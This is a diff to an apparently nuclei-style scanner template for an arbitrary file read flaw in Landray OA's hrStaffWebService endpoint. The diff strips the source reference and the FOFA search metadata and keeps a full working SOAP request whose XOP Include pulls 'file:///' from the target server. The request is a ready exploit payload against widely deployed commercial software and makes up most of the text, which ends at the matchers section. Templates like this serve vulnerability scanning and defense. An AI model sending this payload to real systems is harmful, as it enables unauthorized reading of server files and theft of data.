@@ -3,15 +3,11 @@ info:
   name: 蓝凌OA hrstaffwebservice 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uenkpuwwwami3308'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uenkpuwwwami3308
-    fofa: app="Landray-OA系统"
 http:
 - raw:
-  - "POST /sys/webservice/hrStaffWebService HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36\nContent-Length: 565\nAccept: */*\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US;q=0.9,en;q=0.8\nCache-Control: max-age=0\nConnection: close\nContent-Type: multipart/related; boundary=----j0ofrwsv2dtllbzzkyh9\nSOAPAction: \"\"\n\n------j0ofrwsv2dtllbzzkyh9\nContent-Disposition: form-data; name=\"1\"\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.staff.hr.kmss.landray.com/\">\n<soapenv:Header/>\n<soapenv:Body>\n    <web:getHrStaffElements>\n        <arg0>\n            <beginTimeStamp>1</beginTimeStamp>\n            <count><xop:Include\nxmlns:xop=\"http://www.w3.org/2004/08/xop/include\"\nhref=\"file:///\"/></count>\n        </arg0>\n    </web:getHrStaffElements>\n</soapenv:Body>\n</soapenv:Envelope>\n------j0ofrwsv2dtllbzzkyh9--\n![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730682370777-e2b2f573-0998-47f6-9021-95200261090a.png)"
+  - "POST /sys/webservice/hrStaffWebService HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36\nContent-Length: 565\nAccept: */*\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US;q=0.9,en;q=0.8\nCache-Control: max-age=0\nConnection: close\nContent-Type: multipart/related; boundary=----j0ofrwsv2dtllbzzkyh9\nSOAPAction: \"\"\n\n------j0ofrwsv2dtllbzzkyh9\nContent-Disposition: form-data; name=\"1\"\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.staff.hr.kmss.landray.com/\">\n<soapenv:Header/>\n<soapenv:Body>\n    <web:getHrStaffElements>\n        <arg0>\n            <beginTimeStamp>1</beginTimeStamp>\n            <count><xop:Include\nxmlns:xop=\"http://www.w3.org/2004/08/xop/include\"\nhref=\"file:///\"/></count>\n        </arg0>\n    </web:getHrStaffElements>\n</soapenv:Body>\n</soapenv:Envelope>\n------j0ofrwsv2dtllbzzkyh9--"
   redirects: false
   matchers:
   - status:
